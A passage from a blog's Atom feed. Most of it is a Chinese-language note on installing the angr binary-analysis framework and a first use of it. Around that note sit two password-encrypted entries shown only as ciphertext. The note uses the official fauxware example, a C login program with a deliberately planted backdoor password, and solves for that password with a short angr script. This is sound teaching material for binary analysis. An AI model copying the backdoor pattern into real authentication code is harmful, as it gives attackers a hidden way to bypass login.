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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="arm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>angr learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/</id>
    <published>2019-04-03T06:29:25.000Z</published>
    <updated>2019-04-19T11:33:50.615Z</updated>
    
    <content type="html"><![CDATA[<h3 id="angr学习笔记"><a href="#angr学习笔记" class="headerlink" title="angr学习笔记"></a>angr学习笔记</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是<code>pip install angr</code>却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。</p><blockquote><p>It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team.</p></blockquote><p>既然官方都这么说了，没理由不安装python3版本的，<code>pip3 install angr</code>一把梭吧。然后又报错了</p><pre><code class="bash">SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39;</code></pre><p>明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题</p><blockquote><p>Building <code>unicorn</code> from source requires Python 2, so will fail inside a virtualenv where <code>python</code> gets you Python 3. If you encounter errors with <code>pip install angr</code>, you may need to first install <code>unicorn</code> separately, pointing it to your Python 2: <code>UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn  # Python 2 is probably /usr/bin/python on your macOS system</code></p></blockquote><p>意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。</p><pre><code class="bash">$ cd bindings/python$ sudo make install3$ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot;1.0.0</code></pre><p>通过这样，我的python3环境中也安装了unicorn。这时候再执行<code>pip3 install angr</code>这下一路畅通，安装完成。</p><p>迫不及待尝试导入angr试下，结果又报错了</p><pre><code>angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib  Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib  Reason: image not found)</code></pre><p>这个错误很明显，就是<code>angr_native.dylib</code>中加载<code>libpyvex.dylib</code>的时候找不到该动态库。看了下<code>angr_native.dylib</code>的macho格式里load command中加载<code>libpyvex.dylib</code>部分，发现是在其当前目录下去查找<code>libpyvex.dylib</code>和<code>libunicorn.1.dylib</code>。关于这个问题其实官方文档中也提及到这个问题</p><pre><code class="bash">PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;`UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;`ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;`install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylibinstall_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib</code></pre><p>就是通过重新指定加载<code>libunicorn.dylib</code>和<code>libpyvex.dylib</code> 的位置。执行完脚本以后，angr算是安装完成了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>直接上例子来学习，官方的fauxware例子</p><p>C源码如下</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;char *sneaky = &quot;SOSNEAKY&quot;;int authenticate(char *username, char *password){    char stored_pw[9];    stored_pw[8] = 0;    int pwfile;    // evil back d00r    if (strcmp(password, sneaky) == 0) return 1;    pwfile = open(username, O_RDONLY);    read(pwfile, stored_pw, 8);    if (strcmp(password, stored_pw) == 0) return 1;    return 0;}int accepted(){    printf(&quot;Welcome to the admin console, trusted user!\n&quot;);}int rejected(){    printf(&quot;Go away!&quot;);    exit(1);}int main(int argc, char **argv){    char username[9];    char password[9];    int authed;    username[8] = 0;    password[8] = 0;    printf(&quot;Username: \n&quot;);    read(0, username, 8);    read(0, &amp;authed, 1);    printf(&quot;Password: \n&quot;);    read(0, password, 8);    read(0, &amp;authed, 1);    authed = authenticate(username, password);    if (authed) accepted();    else rejected();}</code></pre><p>简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入</p><pre><code class="python">import angrfilename = &#39;the/filepath/of/fauxware&#39;proj = angr.Project(filename, auto_load_libs=False)st = proj.factory.entry_state()while True:    succ = st.step()    if len(succ.successors) == 2:        break    st = succ.successors[0]st1, st2 = succ.successorsprint(st1, st2)print(st1.posix.dumps(0))print(st2.posix.dumps(0))</code></pre><p>下面解释下这个python代码</p><p><code>proj = angr.Project(filename, auto_load_libs=False)</code>加载一个二进制文件，然后得到一个程序开始处的状态<code>st = proj.factory.entry_state()</code>下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。</p><pre><code>&lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#39;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80@\x80\x80\x00\x00&#39;</code></pre><p>可以看出st1也就是成功授权的输入为SOSNEAKY。</p><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h5><p>该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。</p><ul><li><p>blocks</p><p><code>project.factory.block()</code>给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。</p><pre><code class="python">block = proj.factory.block(proj.entry)block.pp() # 打印block反汇编代码block.instructions # 指令个数block.instruction_addrs # 指令地址list</code></pre></li><li><p>states</p><p>angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。</p><pre><code class="python">state = proj.factory.entry_state()&lt;SimState @ 0x401670&gt;</code></pre><p>既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。</p><pre><code class="python"># 访问寄存器和内存&gt;&gt;&gt; state.regs.rip        # get the current instruction pointer&lt;BV64 0x401670&gt;&gt;&gt;&gt; state.regs.rax&lt;BV64 0x1c&gt;&gt;&gt;&gt; state.mem[proj.entry].int.resolved  # interpret the memory at the entry point as a C int&lt;BV32 0x8949ed31&gt;# 修改寄存器和内存&gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64)&gt;&gt;&gt; state.regs.rsi&lt;BV64 0x3&gt;&gt;&gt;&gt; state.mem[0x1000].long = 4&gt;&gt;&gt; state.mem[0x1000].long.resolved&lt;BV64 0x4&gt;</code></pre><p>这些数据都是bitvectors，所以需要一个转换</p><pre><code class="python">&gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32)       # create a 32-bit-wide bitvector with value 0x1234&lt;BV32 0x1234&gt;                               # BVV stands for bitvector value&gt;&gt;&gt; state.solver.eval(bv)                # convert to python int0x1234</code></pre><p><code>mem</code>有几点需要注意：</p><ul><li><code>.type</code>有<code>char, short, int, long, size_t, uint8_t, uint16_t</code>等</li><li><code>.resolved</code>得到bitvector；<code>.concrete</code>得到int值</li></ul></li><li><p>simulation managers</p><p>state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。</p><pre><code class="python">&gt;&gt;&gt; simgr = proj.factory.simulation_manager(state)&lt;SimulationManager with 1 active&gt;&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x401670&gt;]</code></pre><p>这里我们用state去初始化了simulation managers得到了一组state。<code>.active</code>返回当前state。</p><pre><code class="python">&gt;&gt;&gt; simgr.step()&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x1020300&gt;]&gt;&gt;&gt; simgr.active[0].regs.rip                 # new and exciting!&lt;BV64 0x1020300&gt;&gt;&gt;&gt; state.regs.rip                           # still the same!&lt;BV64 0x401670&gt;</code></pre><p>通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。</p></li></ul><h4 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a>待更新</h4><p>…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://docs.angr.io/core-concepts/" target="_blank" rel="external">https://docs.angr.io/core-concepts/</a></li><li><a href="https://www.secpulse.com/archives/83197.html" target="_blank" rel="external">https://www.secpulse.com/archives/83197.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;angr学习笔记&quot;&gt;&lt;a href=&quot;#angr学习笔记&quot; class=&quot;headerlink&quot; title=&quot;angr学习笔记&quot;&gt;&lt;/a&gt;angr学习笔记&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>applepie writeup分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/</id>
    <published>2019-04-02T06:02:40.000Z</published>
    <updated>2019-04-30T04:08:21.329Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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